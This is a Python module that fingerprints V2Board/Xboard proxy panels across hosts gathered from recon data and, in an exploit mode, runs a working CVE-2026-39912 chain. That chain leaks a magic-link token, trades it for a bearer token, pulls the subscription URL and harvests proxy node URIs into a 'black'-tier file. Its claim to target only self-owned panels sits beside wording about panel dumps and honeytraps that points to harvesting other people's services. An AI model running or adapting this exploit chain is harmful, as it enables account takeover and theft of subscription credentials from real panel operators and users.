"""Stage 17 — A2 V2Board / Xboard panel recon + (self-owned only) exploit chain.

Two modes:

  **recon mode (default)** — passive fingerprint only. For each candidate host
  (from config targets + state/recon_intel.jsonl produced by ct_recon /
  gray_sources), fingerprint the panel via:
    1. GET /api/v1/guest/comm/config   — 200 body containing `V2Board`/`Xboard`
       markers => panel type identified.
    2. GET /api/v1/admin/config/fetch  — 403 "鉴权失败" oracle confirms the
       panel is V2Board-family (auth-gated admin endpoint).

  Leads are appended to state/recon-leads.jsonl. NO magic-link request is sent
  against wild panels.

  **exploit mode (--exploit)** — only runs against `targets` listed in
  config/v2board_targets.yaml (self-owned / authorized panels). Executes the
  CVE-2026-39912 chain:
    1. POST /api/v1/passport/auth/loginWithMailLink {email}
       -> response.data leaks the magic-link URL containing verify=<TOKEN>
    2. GET  /api/v1/passport/auth/token2Login?verify=<TOKEN>
       -> {token, auth_data: "Bearer ...", is_admin}
    3. GET  /api/v1/user/getSubscribe   Authorization: <auth_data>
       -> {data: {subscribe_url}}
    4. fetch subscribe_url -> base64 decode -> regex extract URIs
    5. URIs appended to state/gray_nodes.jsonl with tier="black",
       source_channel="A2", enabled=false, watermark_suspect=true.

  Watermark suspicion is flagged by default on every A2-exploited node — these
  came from a panel dump and panels commonly issue per-user watermarked tokens
  (see _gray_deep_research.md A2 §risk). A human must run honeytrap triage
  before enabling.

Run directly:
    python src/aggregator/v2board_recon.py             # recon mode
    python src/aggregator/v2board_recon.py --exploit   # exploit (needs targets)

CLI:
    python src/aggregator/cli.py v2board-recon
    python src/aggregator/cli.py v2board-recon --exploit
"""

from __future__ import annotations

import argparse
import asyncio
import base64
import json
import os
import re
import time
from pathlib import Path
from typing import Any

import httpx
import yaml

ROOT = Path(__file__).resolve().parents[2]
CONFIG_FILE = ROOT / "config" / "v2board_targets.yaml"
STATE_DIR = ROOT / "state"
RECON_INTEL_FILE = STATE_DIR / "recon_intel.jsonl"
RECON_LEADS_FILE = STATE_DIR / "recon-leads.jsonl"
GRAY_NODES_FILE = STATE_DIR / "gray_nodes.jsonl"

# Panel-type markers found in /api/v1/guest/comm/config response body.
PANEL_MARKERS = ("V2Board", "Xboard", "v2board", "xboard")

# Oracle phrase returned by V2Board-family admin endpoint when unauthenticated.
# (sshui PoC: 403 "鉴权失败" confirms V2Board.)
AUTH_FAIL_PHRASES = ("鉴权失败", "Unauthorized", "未登录", "permission")

# URI schemes harvested from subscribe content (mirrors gray_sources.URI_RE).
URI_RE = re.compile(
    r"(?<![\w-])((?:vmess|vless|trojan|ss|ssr|tuic|hysteria2?|hy2|juicity)://[^\s<>\"'#,]+)",
    re.IGNORECASE,
)

# verify= token inside the magic-link URL leaked in loginWithMailLink response.
VERIFY_RE = re.compile(r"verify=([A-Za-z0-9%._\-]+)")


# ---------------------------------------------------------------------------
# Config loading + env expansion (mirrors gray_sources)
# ---------------------------------------------------------------------------


def _expand_env(value: Any) -> Any:
    if isinstance(value, str):
        return re.sub(
            r"\$\{([A-Za-z_][A-Za-z0-9_]*)\}",
            lambda m: os.environ.get(m.group(1), ""),
            value,
        )
    if isinstance(value, list):
        return [_expand_env(v) for v in value]
    if isinstance(value, dict):
        return {k: _expand_env(v) for k, v in value.items()}
    return value


def load_config() -> dict:
    if not CONFIG_FILE.exists():
        return {}
    with CONFIG_FILE.open("r", encoding="utf-8") as f:
        raw = yaml.safe_load(f) or {}
    return _expand_env(raw)


def _log(msg: str) -> None:
    print(f"[v2board-recon] {msg}", flush=True)


# ---------------------------------------------------------------------------
# Host normalization
# ---------------------------------------------------------------------------

_TLS_PORTS = (443, 2053, 2083, 2087, 2096, 8443)


def _base_url(host: str, port: int | None, scheme: str | None) -> str:
    if not scheme:
        scheme = "https" if (port or 443) in _TLS_PORTS else "http"
    return f"{scheme}://{host}:{port}" if port else f"{scheme}://{host}"


def _split_host_port(host_field: str, default_port: int = 443) -> tuple[str, int]:
    host_field = (host_field or "").strip()
    if not host_field:
        return "", default_port
    if host_field.startswith("["):
        end = host_field.find("]")
        if end != -1:
            host = host_field[1:end]
            rest = host_field[end + 1 :]
            port = (
                int(rest.lstrip(":"))
                if rest.startswith(":") and rest[1:].isdigit()
                else default_port
            )
            return host, port
    parts = host_field.rsplit(":", 1)
    if len(parts) == 2 and parts[1].isdigit():
        return parts[0], int(parts[1])
    return host_field, default_port


# ---------------------------------------------------------------------------
# Recon mode: fingerprint
# ---------------------------------------------------------------------------


async def fingerprint_panel(
    client: httpx.AsyncClient,
    host: str,
    port: int | None = None,
    scheme: str | None = None,
    timeout: float = 15.0,
) -> dict:
    """Fingerprint a single host.

    Returns dict:
      host, port, panel_type (V2Board|Xboard|unknown), version_hint,
      vulnerable_suspect (bool), evidence (str).
    """
    base = _base_url(host, port, scheme)
    result: dict[str, Any] = {
        "host": host,
        "port": port or 443,
        "panel_type": "unknown",
        "version_hint": None,
        "vulnerable_suspect": False,
        "evidence": "",
    }

    # 1. /api/v1/guest/comm/config — public config, reveals panel markers.
    guest_url = f"{base}/api/v1/guest/comm/config"
    guest_body = ""
    try:
        r = await client.get(guest_url, timeout=timeout)
        if r.status_code == 200:
            guest_body = r.text
    except Exception as e:  # noqa: BLE001
        result["evidence"] = f"guest config fetch failed: {type(e).__name__}"
        _log(f"  {host}: guest config failed: {type(e).__name__}")
        return result

    body_lower = guest_body.lower()
    if "xboard" in body_lower:
        result["panel_type"] = "Xboard"
    elif "v2board" in body_lower:
        result["panel_type"] = "V2Board"
    # Some configs only emit the string in version fields / app name.
    for m in PANEL_MARKERS:
        if m.lower() in body_lower:
            if result["panel_type"] == "unknown":
                result["panel_type"] = "V2Board"

    # crude version hint: look for version-ish keys in JSON body
    vm = re.search(r'"version"\s*:\s*"([^"]+)"', guest_body)
    if vm:
        result["version_hint"] = vm.group(1)

    # 2. /api/v1/admin/config/fetch — 403 "鉴权失败" oracle confirms V2Board family.
    admin_url = f"{base}/api/v1/admin/config/fetch"
    try:
        ar = await client.get(admin_url, timeout=timeout)
        code = ar.status_code
        atext = ar.text or ""
    except Exception as e:  # noqa: BLE001
        # admin endpoint unreachable is non-fatal; keep guest result.
        result["evidence"] = (
            f"guest=200 panel_type={result['panel_type']}; "
            f"admin fetch failed: {type(e).__name__}"
        )
        _log(f"  {host}: panel_type={result['panel_type']} (admin unreachable)")
        return result

    oracle = code == 403 and any(p in atext for p in AUTH_FAIL_PHRASES)
    if oracle:
        # 403 + auth-fail phrase is the V2Board-family signature.
        if result["panel_type"] == "unknown":
            result["panel_type"] = "V2Board"
        result["vulnerable_suspect"] = True
        result["evidence"] = (
            f"guest=200 panel_type={result['panel_type']}; "
            f"admin=403 auth-fail-oracle (V2Board-family confirmed)"
        )
    else:
        result["evidence"] = (
            f"guest=200 panel_type={result['panel_type']}; "
            f"admin={code} (no auth-fail oracle)"
        )

    _log(
        f"  {host}: panel_type={result['panel_type']} "
        f"suspect={result['vulnerable_suspect']}"
    )
    return result


def _load_recon_intel_hosts() -> list[str]:
    """Read hosts from state/recon_intel.jsonl (ct_recon / gray_sources output).

    Each line is a JSON object with at least a `host`/`domain`/`sni` field.
    Returns unique host strings.
    """
    hosts: list[str] = []
    seen: set[str] = set()
    if not RECON_INTEL_FILE.exists():
        return hosts
    try:
        with RECON_INTEL_FILE.open("r", encoding="utf-8") as f:
            for line in f:
                line = line.strip()
                if not line:
                    continue
                try:
                    rec = json.loads(line)
                except Exception:  # noqa: BLE001
                    continue
                h = (
                    rec.get("host")
                    or rec.get("domain")
                    or rec.get("sni")
                    or rec.get("ip")
                )
                if not h:
                    continue
                host, _ = _split_host_port(str(h))
                host = host.strip()
                if host and host not in seen:
                    seen.add(host)
                    hosts.append(host)
    except Exception as e:  # noqa: BLE001
        _log(f"recon_intel.jsonl read failed: {type(e).__name__}")
    return hosts


def _append_leads(results: list[dict]) -> int:
    """Append fingerprint results to state/recon-leads.jsonl (jsonl, one per line)."""
    STATE_DIR.mkdir(parents=True, exist_ok=True)
    ts = int(time.time())
    n = 0
    with RECON_LEADS_FILE.open("a", encoding="utf-8") as f:
        for r in results:
            rec = dict(r)
            rec["ts"] = ts
            rec["source"] = "A2-recon"
            f.write(json.dumps(rec, ensure_ascii=False) + "\n")
            n += 1
    return n


async def run_recon() -> dict:
    """Recon mode: fingerprint all candidates (config targets + recon_intel).

    Wild panels are ONLY fingerprinted. No exploit requests are sent.
    """
    cfg = load_config()
    timeout = float(cfg.get("request_timeout_seconds", 15.0))
    verify = bool(cfg.get("verify_tls", False))
    rate = float(cfg.get("rate_limit_seconds", 1.0))

    hosts: list[tuple[str, int | None, str | None]] = []
    # 1a. Config `recon_targets` — public/known demo panels for fingerprint
    # practice (NEVER exploited). Same shape as `targets`.
    for t in cfg.get("recon_targets") or []:
        host_field = str(t.get("host", "")).strip()
        if not host_field:
            continue
        host, p = _split_host_port(host_field, default_port=443)
        port = t.get("port") or p
        scheme = t.get("scheme")
        hosts.append((host, port, scheme))

    # 1b. Config `targets` are also fingerprinted in recon mode (they are
    # self-owned panels, so fingerprinting them is safe and useful even when
    # not running --exploit).
    for t in cfg.get("targets") or []:
        host_field = str(t.get("host", "")).strip()
        if not host_field:
            continue
        host, p = _split_host_port(host_field, default_port=443)
        port = t.get("port") or p
        scheme = t.get("scheme")
        hosts.append((host, port, scheme))

    if cfg.get("recon_from_intel", True):
        for h in _load_recon_intel_hosts():
            hosts.append((h, None, None))

    # dedup by host
    seen: set[str] = set()
    unique_hosts: list[tuple[str, int | None, str | None]] = []
    for h, p, s in hosts:
        if h in seen:
            continue
        seen.add(h)
        unique_hosts.append((h, p, s))

    summary = {
        "mode": "recon",
        "candidates": len(unique_hosts),
        "fingerprinted": 0,
        "v2board_count": 0,
        "xboard_count": 0,
        "vulnerable_suspect": 0,
        "leads_written": 0,
    }
    if not unique_hosts:
        _log(
            "no candidates (config targets empty + no recon_intel.jsonl) — nothing to do."
        )
        return summary

    headers = {"User-Agent": "v2board-recon/1.0"}
    results: list[dict] = []
    async with httpx.AsyncClient(
        verify=verify, timeout=timeout, headers=headers, follow_redirects=True
    ) as client:
        for host, port, scheme in unique_hosts:
            try:
                r = await fingerprint_panel(client, host, port, scheme, timeout)
            except Exception as e:  # noqa: BLE001
                _log(f"  {host}: fingerprint crashed: {type(e).__name__}: {e}")
                continue
            results.append(r)
            if r["panel_type"] == "V2Board":
                summary["v2board_count"] += 1
            elif r["panel_type"] == "Xboard":
                summary["xboard_count"] += 1
            if r["vulnerable_suspect"]:
                summary["vulnerable_suspect"] += 1
            await asyncio.sleep(rate)

    summary["fingerprinted"] = len(results)
    summary["leads_written"] = _append_leads(results)
    _log(f"recon done: {summary}")
    return summary


# ---------------------------------------------------------------------------
# Exploit mode: CVE-2026-39912 chain (self-owned / authorized targets only)
# ---------------------------------------------------------------------------


async def _fetch_subscribe_uris(
    client: httpx.AsyncClient, subscribe_url: str, timeout: float = 15.0
) -> list[str]:
    """Fetch subscribe content, base64-decode if needed, regex out URIs."""
    try:
        r = await client.get(subscribe_url, timeout=timeout)
    except Exception as e:  # noqa: BLE001
        _log(f"  fetch subscribe content failed: {type(e).__name__}")
        return []
    if r.status_code >= 400:
        _log(f"  subscribe content HTTP {r.status_code}")
        return []
    text = (r.text or "").strip()

    decoded: str | None = None
    try:
        cand = re.sub(r"\s+", "", text)
        if re.fullmatch(r"[A-Za-z0-9+/=]{32,}", cand):
            decoded = base64.b64decode(cand, validate=True).decode(
                "utf-8", errors="ignore"
            )
    except Exception:  # noqa: BLE001
        decoded = None

    for blob in (text, decoded) if decoded else (text,):
        found = URI_RE.findall(blob or "")
        if found:
            return found
    return []


async def exploit_chain(
    client: httpx.AsyncClient,
    host: str,
    port: int | None,
    scheme: str | None,
    email: str,
    timeout: float = 15.0,
) -> list[str]:
    """Run CVE-2026-39912 chain on ONE self-owned / authorized panel.

    Returns list of harvested URIs (may be empty on any failure).
    """
    base = _base_url(host, port, scheme)

    # 1. loginWithMailLink leaks the magic-link URL in the response body.
    try:
        r = await client.post(
            f"{base}/api/v1/passport/auth/loginWithMailLink",
            json={"email": email},
            timeout=timeout,
        )
    except Exception as e:  # noqa: BLE001
        _log(f"  {host}: loginWithMailLink connect failed: {type(e).__name__}")
        return []

    if r.status_code >= 400:
        _log(f"  {host}: loginWithMailLink HTTP {r.status_code} — abort")
        return []
    try:
        body = r.json()
    except Exception:  # noqa: BLE001
        _log(f"  {host}: loginWithMailLink non-JSON — abort")
        return []

    data = body.get("data") if isinstance(body, dict) else None
    link = data if isinstance(data, str) else ""
    if not link and isinstance(data, dict):
        link = data.get("link") or data.get("url") or ""

    if not link:
        _log(
            f"  {host}: loginWithMailLink returned no magic link — not vulnerable / patched"
        )
        return []

    vm = VERIFY_RE.search(link)
    if not vm:
        _log(f"  {host}: magic link has no verify token — abort")
        return []
    token = vm.group(1)

    # 2. token2Login exchanges verify token for auth_data bearer.
    try:
        tr = await client.get(
            f"{base}/api/v1/passport/auth/token2Login",
            params={"verify": token},
            timeout=timeout,
        )
    except Exception as e:  # noqa: BLE001
        _log(f"  {host}: token2Login connect failed: {type(e).__name__}")
        return []
    if tr.status_code >= 400:
        _log(f"  {host}: token2Login HTTP {tr.status_code} — abort")
        return []
    try:
        tbody = tr.json()
    except Exception:  # noqa: BLE001
        _log(f"  {host}: token2Login non-JSON — abort")
        return []

    auth_data = tbody.get("auth_data") if isinstance(tbody, dict) else None
    if not auth_data:
        # Some V2Board variants return a bare `token`.
        auth_data = tbody.get("token") if isinstance(tbody, dict) else None
    if not auth_data:
        _log(f"  {host}: token2Login returned no auth_data — abort")
        return []

    # auth_data is typically already "Bearer <jwt>"; if it doesn't start with
    # Bearer, wrap it.
    authz = (
        auth_data
        if str(auth_data).lower().startswith("bearer ")
        else f"Bearer {auth_data}"
    )

    # 3. getSubscribe -> subscribe_url.
    try:
        sr = await client.get(
            f"{base}/api/v1/user/getSubscribe",
            headers={"Authorization": authz},
            timeout=timeout,
        )
    except Exception as e:  # noqa: BLE001
        _log(f"  {host}: getSubscribe connect failed: {type(e).__name__}")
        return []
    if sr.status_code >= 400:
        _log(f"  {host}: getSubscribe HTTP {sr.status_code} — abort")
        return []
    try:
        sbody = sr.json()
    except Exception:  # noqa: BLE001
        _log(f"  {host}: getSubscribe non-JSON — abort")
        return []
    sdata = sbody.get("data") if isinstance(sbody, dict) else None
    subscribe_url = (
        sdata.get("subscribe_url") if isinstance(sdata, dict) else None
    ) or (sdata.get("token") if isinstance(sdata, dict) else None)
    if not subscribe_url:
        _log(f"  {host}: getSubscribe no subscribe_url — abort")
        return []

    _log(f"  {host}: subscribe_url acquired -> {subscribe_url[:80]}")
    uris = await _fetch_subscribe_uris(client, subscribe_url, timeout)
    _log(f"  {host}: harvested {len(uris)} URIs")
    return uris


def _append_gray_nodes(uris: list[str], host: str) -> int:
    """Write harvested URIs to state/gray_nodes.jsonl as JSON lines.

    Format compatible with resin_publisher._extract_uri (uses `raw` field):
      {raw, uri, tier, source_channel, enabled, watermark_suspect,
       provenance: {...}, ts}

    A2-exploited nodes default to enabled=false + watermark_suspect=true —
    a human must run honeytrap triage before enabling.
    """
    STATE_DIR.mkdir(parents=True, exist_ok=True)
    existing: set[str] = set()
    if GRAY_NODES_FILE.exists():
        with GRAY_NODES_FILE.open("r", encoding="utf-8") as f:
            for line in f:
                line = line.strip()
                if not line:
                    continue
                try:
                    rec = json.loads(line)
                    u = rec.get("raw") or rec.get("uri")
                    if isinstance(u, str):
                        existing.add(u)
                except Exception:  # noqa: BLE001
                    # plain URI line
                    if line.lower().startswith(
                        (
                            "vmess://",
                            "vless://",
                            "trojan://",
                            "ss://",
                            "ssr://",
                            "tuic://",
                            "hysteria2://",
                            "hy2://",
                            "juicity://",
                        )
                    ):
                        existing.add(line)

    ts = int(time.time())
    n = 0
    with GRAY_NODES_FILE.open("a", encoding="utf-8") as f:
        for u in uris:
            if not u or u in existing:
                continue
            existing.add(u)
            rec = {
                "raw": u,
                "uri": u,
                "tier": "black",
                "source_channel": "A2",
                "enabled": False,
                "watermark_suspect": True,
                "provenance": {
                    "panel": host,
                    "cve": "CVE-2026-39912",
                    "chain": "loginWithMailLink->token2Login->getSubscribe",
                    "first_seen_ts": ts,
                },
                "ts": ts,
            }
            f.write(json.dumps(rec, ensure_ascii=False) + "\n")
            n += 1
    return n


async def run_exploit() -> dict:
    """Exploit mode: ONLY against config targets (self-owned / authorized)."""
    cfg = load_config()
    targets = cfg.get("targets") or []
    if not targets:
        _log(
            "exploit mode: no targets in config/v2board_targets.yaml — refusing to run."
        )
        _log(
            "(exploit is ONLY for self-owned / authorized panels; wild panels are recon-only)"
        )
        return {
            "mode": "exploit",
            "targets": 0,
            "uris_harvested": 0,
            "nodes_written": 0,
        }

    timeout = float(cfg.get("request_timeout_seconds", 15.0))
    verify = bool(cfg.get("verify_tls", False))
    rate = float(cfg.get("rate_limit_seconds", 1.0))
    default_email = cfg.get("default_email", "admin@demo.com")

    summary = {
        "mode": "exploit",
        "targets": len(targets),
        "uris_harvested": 0,
        "nodes_written": 0,
        "panels_chained": 0,
    }
    headers = {"User-Agent": "v2board-recon/1.0"}
    async with httpx.AsyncClient(
        verify=verify, timeout=timeout, headers=headers, follow_redirects=True
    ) as client:
        for t in targets:
            host_field = str(t.get("host", "")).strip()
            if not host_field:
                continue
            host, p = _split_host_port(host_field, default_port=443)
            port = t.get("port") or p
            scheme = t.get("scheme")
            email = t.get("email") or default_email
            _log(f"exploit chain on {host}:{port} (email={email})...")
            uris = await exploit_chain(client, host, port, scheme, email, timeout)
            if uris:
                summary["panels_chained"] += 1
                summary["uris_harvested"] += len(uris)
                written = _append_gray_nodes(uris, host)
                summary["nodes_written"] += written
            await asyncio.sleep(rate)

    _log(f"exploit done: {summary}")
    return summary


# ---------------------------------------------------------------------------
# Entry points
# ---------------------------------------------------------------------------


def run(exploit: bool = False) -> dict:
    """Synchronous entry used by CLI / direct invocation."""
    import asyncio

    if exploit:
        return asyncio.run(run_exploit())
    return asyncio.run(run_recon())


if __name__ == "__main__":
    ap = argparse.ArgumentParser(description="V2Board/Xboard recon + exploit (A2)")
    ap.add_argument(
        "--exploit",
        action="store_true",
        help="exploit mode (ONLY self-owned / authorized config targets)",
    )
    args = ap.parse_args()
    print(json.dumps(run(exploit=args.exploit), ensure_ascii=False, indent=2))
